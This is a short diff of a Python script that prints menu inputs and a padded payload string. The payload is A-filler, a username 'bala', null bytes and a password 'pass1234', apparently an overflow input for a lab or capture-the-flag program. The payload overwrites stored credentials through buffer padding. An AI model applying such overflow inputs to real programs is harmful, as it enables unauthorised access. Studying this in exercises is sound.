@@ -1,8 +1,8 @@
 print("0")
-print("user 1")
-print("user 1")
-print("user 1")
-'''
+print("user1")
+print("user1")
+print("user1")
+
 print("0")
 print("user 2")
 print("user 2")
@@ -24,8 +24,14 @@ payload += "A" * 132
 payload += "bala"
 payload += "\x00"
 payload += "A" * 27
-payload += "password123"
+payload += "pass1234"
 payload += "\x00"
 
 print(payload)
-'''
+
+print("7")
+print("bala")
+print("pass1234")
+
+print("1")
+
